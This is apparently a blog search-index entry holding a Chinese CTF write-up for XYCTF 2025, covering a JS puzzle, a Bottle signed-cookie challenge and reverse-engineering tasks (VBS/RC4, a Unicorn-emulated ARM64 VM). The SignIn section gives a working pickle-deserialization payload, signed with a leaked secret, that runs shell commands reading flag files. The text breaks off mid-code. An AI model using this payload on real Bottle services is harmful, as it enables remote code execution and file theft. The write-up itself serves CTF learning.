<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>XYCTF25 不知道 WP</title>
    <url>/2025/04/07/XYCTF25-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/</url>
    <content><![CDATA[<h1 id="战队名：不知道"><a href="#战队名：不知道" class="headerlink" title="战队名：不知道"></a>战队名：不知道</h1><p><strong>排名</strong>：<strong>1</strong></p>
<p><img src="/images/e859cd5cae823fc6e9ecd736647c7dab-1744626745337-9.png" loading="lazy"></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h3><p>查看js源码，找到_3KH_函数判断输出flag的地方</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token punctuation">(</span>G <span class="token operator">></span> yw4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      alert<span class="token punctuation">(</span>O<span class="token punctuation">[</span>s74<span class="token punctuation">]</span><span class="token punctuation">(</span>J74<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      alert<span class="token punctuation">(</span>$vfeRha_calc<span class="token punctuation">(</span>S74 <span class="token operator">+</span> G <span class="token operator">/</span> Rw4<span class="token punctuation">,</span> Y74<span class="token punctuation">,</span> $v5sNVR<span class="token punctuation">(</span>vS4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span></code></pre>

<p>运行到此处即可</p>
<p><img src="/images/image-1744626745337-3.png" loading="lazy"></p>
<h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><p>访问&#x2F;secret 获得cookie </p>
<p>疑似Bottle 框架的 signed cookie</p>
<p>signed cookie 构造</p>
<p><code>!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=</code>是 base 64 编码的   HMAC - SHA 1 签名</p>
<p><code>gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu</code>是 base64 编码的 Python 数据，反序列化后应该是</p>
<p>也就是说第二端可以通过pickle 序列化攻击实现 rce</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bottle <span class="token keyword">import</span> SimpleCookie
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> hmac
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> pickle

<span class="token keyword">def</span> <span class="token function">make_signed_cookie</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    pickled <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    digest <span class="token operator">=</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pickled<span class="token punctuation">,</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cookie <span class="token operator">=</span> <span class="token string">'!'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'?'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cookie

<span class="token comment"># 假设你已经拿到 secret 内容：</span>
secret <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment"># ← 替换成实际值</span>
data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">&#125;</span>
signed_cookie <span class="token operator">=</span> make_signed_cookie<span class="token punctuation">(</span>secret<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"伪造的 Cookie 值："</span><span class="token punctuation">,</span> signed_cookie<span class="token punctuation">)</span></code></pre>

<p>通过&#x2F;download 读取 签名</p>
<p><img src="/images/image-20250406194123399-1744626745337-4.png" loading="lazy"></p>
<pre class="language-vbnet" data-language="vbnet"><code class="language-vbnet">Hell0_H@cker_Y0u_A3r_Sm@r7</code></pre>

<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> bottle <span class="token keyword">import</span> SimpleCookie
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> hmac
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> pickle

<span class="token keyword">def</span> <span class="token function">make_signed_cookie</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    pickled <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    digest <span class="token operator">=</span> hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pickled<span class="token punctuation">,</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cookie <span class="token operator">=</span> <span class="token string">'!'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'?'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cookie

secret <span class="token operator">=</span> <span class="token string">"Hell0_H@cker_Y0u_A3r_Sm@r7"</span>  
<span class="token keyword">class</span> <span class="token class-name">Data</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
         
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag*>/test.txt').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> Data<span class="token punctuation">(</span><span class="token punctuation">)</span>
encoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span>
signed_cookie <span class="token operator">=</span> make_signed_cookie<span class="token punctuation">(</span>secret<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"伪造的 Cookie 值："</span><span class="token punctuation">,</span> signed_cookie<span class="token punctuation">)</span></code></pre>

<p>伪造cookie成功后再通过download 路由实现任意文件读取</p>
<p><img src="/images/image-20250406200423921-1744626745337-5.png" loading="lazy"></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="WARMUP"><a href="#WARMUP" class="headerlink" title="WARMUP"></a>WARMUP</h3><p>网上抄的VBS解密代码</p>
<pre class="language-vbscript" data-language="vbscript"><code class="language-vbscript">Function Defuscator(vbs)
    Dim t
    t &#x3D; InStr(1, vbs, &quot;Execute&quot;, 1)
    t &#x3D; Mid(vbs, t + Len(&quot;Execute&quot;))
    t &#x3D; Eval(t)
    Defuscator &#x3D; t
End Function

Dim fso, i, outFile
Const ForReading &#x3D; 1, ForWriting &#x3D; 2
Set fso &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)

    &#39; 创建或打开一个文件用于写入输出
    Set outFile &#x3D; fso.OpenTextFile(&quot;output.txt&quot;, ForWriting, True)

        For i &#x3D; 0 To WScript.Arguments.Count - 1
        Dim FileName
        FileName &#x3D; WScript.Arguments(i)
        Dim MyFile
        Set MyFile &#x3D; fso.OpenTextFile(FileName, ForReading)
            Dim vbs
            vbs &#x3D; MyFile.ReadAll
            outFile.WriteLine Defuscator(vbs)
            MyFile.Close
        Next

        outFile.Close
        Set fso &#x3D; Nothing</code></pre>

<p>output.txt:</p>
<pre class="language-vbscript" data-language="vbscript"><code class="language-vbscript">MsgBox &quot;Dear CTFER. Have fun in XYCTF 2025!&quot;
flag &#x3D; InputBox(&quot;Enter the FLAG:&quot;, &quot;XYCTF&quot;)
wefbuwiue &#x3D; &quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot; &#39; 棰勮鐨凴C4鍔犲瘑缁撴灉锛堝崄鍏繘鍒舵牸寮忥級
qwfe &#x3D; &quot;rc4key&quot;

&#39; 淇鍚庣殑RC4鍔犲瘑鍑芥暟
Function RunRC(sMessage, strKey)
    Dim kLen, i, j, temp, pos, outHex
    Dim s(255), k(255)
    
    &#39; 鍒濆鍖栧瘑閽?
    kLen &#x3D; Len(strKey)
    For i &#x3D; 0 To 255
        s(i) &#x3D; i
        k(i) &#x3D; Asc(Mid(strKey, (i Mod kLen) + 1, 1)) &#39; 瀵嗛挜浣跨敤ASCII缂栫爜
    Next
    
    &#39; KSA瀵嗛挜璋冨害
    j &#x3D; 0
    For i &#x3D; 0 To 255
        j &#x3D; (j + s(i) + k(i)) Mod 256
        temp &#x3D; s(i)
        s(i) &#x3D; s(j)
        s(j) &#x3D; temp
    Next
    
    &#39; PRGA鍔犲瘑娴佺▼
    i &#x3D; 0 : j &#x3D; 0 : outHex &#x3D; &quot;&quot;
    For pos &#x3D; 1 To Len(sMessage)
        i &#x3D; (i + 1) Mod 256
        j &#x3D; (j + s(i)) Mod 256
        temp &#x3D; s(i)
        s(i) &#x3D; s(j)
        s(j) &#x3D; temp
        
        &#39; 鍔犲瘑骞惰浆涓哄崄鍏繘鍒?
        Dim plainChar, cipherByte
        plainChar &#x3D; Asc(Mid(sMessage, pos, 1)) &#39; 鏄庢枃鎸堿SCII澶勭悊
        cipherByte &#x3D; s((s(i) + s(j)) Mod 256) Xor plainChar
        outHex &#x3D; outHex &amp; Right(&quot;0&quot; &amp; Hex(cipherByte), 2)
    Next
    
    RunRC &#x3D; outHex
End Function

&#39; 涓婚獙璇侀€昏緫
If LCase(RunRC(flag, qwfe)) &#x3D; LCase(wefbuwiue) Then
    MsgBox &quot;Congratulations! Correct FLAG!&quot;
Else
    MsgBox &quot;Wrong flag.&quot;
End If


</code></pre>

<p>RC4解密，密钥为<strong>rc4key</strong></p>
<p><img src="/images/1-1744626745337-7.png" loading="lazy"></p>
<p>flag{We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wn‘s_chall_is_r3@lly_gr3@t_&amp;_fuN!}</p>
<h3 id="ezVM"><a href="#ezVM" class="headerlink" title="ezVM"></a>ezVM</h3><p>通过字符串界面里的unicorn和加密函数的一些特征发现是使用了unicorn框架调用了一串代码。</p>
<p>找一个使用unicorn框架的程序进行bindiff恢复一些unicorn函数的符号。</p>
<p>发现是调用了一串ARM64的代码字节进行模拟执行，将输入字符串传入加密返回，并附上了一些data和栈空间初始化。</p>
<p><img src="/images/2-1744626745337-6.png" loading="lazy"></p>
<p><img src="/images/4-1744626745337-8.png" loading="lazy"></p>
<p>将以上调用write写入的数据提取，随便找一个ARM64框架的.so复制到对应地址，以便反编译看代码。</p>
<p>最后得到一个函数，很清晰的看出里面是一个VM虚拟机执行的流程。</p>
<p><img src="/images/5-1744626745337-10.png" loading="lazy"></p>
<p>使用c++编写代码调用unicorn库进行模拟。</p>
<p>使用Hook，在关键计算地址处进行Hook，输出各个计算流程以及数据。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"data.hpp"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"unicorn/unicorn.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">comment</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span></span><span class="token string">"unicorn-import.lib"</span><span class="token expression"><span class="token punctuation">)</span></span></span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hook_code</span><span class="token punctuation">(</span>uc_engine<span class="token operator">*</span> uc<span class="token punctuation">,</span> <span class="token keyword">uint64_t</span> address<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> size<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> user_data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">uint64_t</span> w0<span class="token punctuation">,</span>w1<span class="token punctuation">,</span>w2<span class="token punctuation">,</span>w3<span class="token punctuation">,</span>w4<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x1fac</span><span class="token punctuation">)</span> 
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W3 = W1 ^ W0 --- %llx ^ %llx = %llx\n"</span><span class="token punctuation">,</span> w1<span class="token punctuation">,</span>w0<span class="token punctuation">,</span>w1<span class="token operator">^</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x2BE4</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W3 = W1 >> W0 --- %llx >> %llx = %llx\n"</span><span class="token punctuation">,</span> w1<span class="token punctuation">,</span> w0<span class="token punctuation">,</span> w1 <span class="token operator">>></span> w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x2DB4</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W3 = W1 &lt;&lt; W0 --- %llx &lt;&lt; %llx = %llx\n"</span><span class="token punctuation">,</span> w1<span class="token punctuation">,</span> w0<span class="token punctuation">,</span> w1 <span class="token operator">&lt;&lt;</span> w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x232C</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W2 = W0 &amp; W3 --- %llx &amp; %llx = %llx\n"</span><span class="token punctuation">,</span> w0<span class="token punctuation">,</span> w3<span class="token punctuation">,</span> w0 <span class="token operator">&amp;</span> w3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x2054</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W2 = W0 ^ W3 --- %llx ^ %llx = %llx\n"</span><span class="token punctuation">,</span> w0<span class="token punctuation">,</span> w3<span class="token punctuation">,</span> w3 <span class="token operator">^</span> w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x2238</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W2 = W0 ^ W3 --- %llx ^ %llx = %llx\n"</span><span class="token punctuation">,</span> w0<span class="token punctuation">,</span> w3<span class="token punctuation">,</span> w3 <span class="token operator">^</span> w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x2180</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W4<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w4<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W1 = W1 ^ W4 --- %llx ^ %llx = %llx\n"</span><span class="token punctuation">,</span> w1<span class="token punctuation">,</span> w4<span class="token punctuation">,</span> w1 <span class="token operator">^</span> w4<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x1CC4</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W2 = W1 + W0 --- %llx + %llx = %llx\n"</span><span class="token punctuation">,</span> w1<span class="token punctuation">,</span> w0<span class="token punctuation">,</span> w1 <span class="token operator">+</span> w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x1A0C</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W2 = W1 + W0 --- %llx + %llx = %llx\n"</span><span class="token punctuation">,</span> w1<span class="token punctuation">,</span> w0<span class="token punctuation">,</span> w1 <span class="token operator">+</span> w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint8_t</span> Input<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"11112222111111111111111111111111"</span><span class="token punctuation">;</span>
    uc_engine<span class="token operator">*</span> uc<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    uc_hook hook<span class="token punctuation">;</span>
    <span class="token keyword">uint64_t</span> InputAddr <span class="token operator">=</span> <span class="token number">0x14C28</span><span class="token punctuation">;</span>
    <span class="token keyword">uint64_t</span> Stack <span class="token operator">=</span> <span class="token number">0x7F0000</span><span class="token punctuation">;</span>
    <span class="token keyword">uint8_t</span> MyEncFlag<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">uint64_t</span> Base <span class="token operator">=</span> <span class="token number">0x0000000001000000</span><span class="token punctuation">;</span>
    <span class="token function">uc_open</span><span class="token punctuation">(</span>uc_arch<span class="token double-colon punctuation">::</span>UC_ARCH_ARM64<span class="token punctuation">,</span> uc_mode<span class="token double-colon punctuation">::</span>UC_MODE_ARM<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_mem_map</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> Base<span class="token punctuation">,</span> UC_PROT_ALL<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_mem_map</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> Stack <span class="token operator">-</span> <span class="token number">4096</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> UC_PROT_ALL<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_hook_add</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hook<span class="token punctuation">,</span> UC_HOOK_CODE<span class="token punctuation">,</span> hook_code<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_mem_write</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0x14C28</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>Input<span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_mem_write</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0x0C70</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>Code<span class="token punctuation">,</span> <span class="token number">8840u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_mem_write</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0x14010</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>Data1<span class="token punctuation">,</span> <span class="token number">0x9B8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_mem_write</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0x30F0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>Data2<span class="token punctuation">,</span> <span class="token number">0x54u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_mem_write</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0x149E8</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>Data3<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_reg_write</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>InputAddr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// X0</span>
    <span class="token function">uc_reg_write</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>Stack<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// SP</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">uc_emu_start</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0x0C70</span><span class="token punctuation">,</span> <span class="token number">0x2EF4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_mem_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> InputAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>MyEncFlag<span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%X "</span><span class="token punctuation">,</span> MyEncFlag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">uc_close</span><span class="token punctuation">(</span>uc<span class="token punctuation">)</span><span class="token punctuation">;</span>
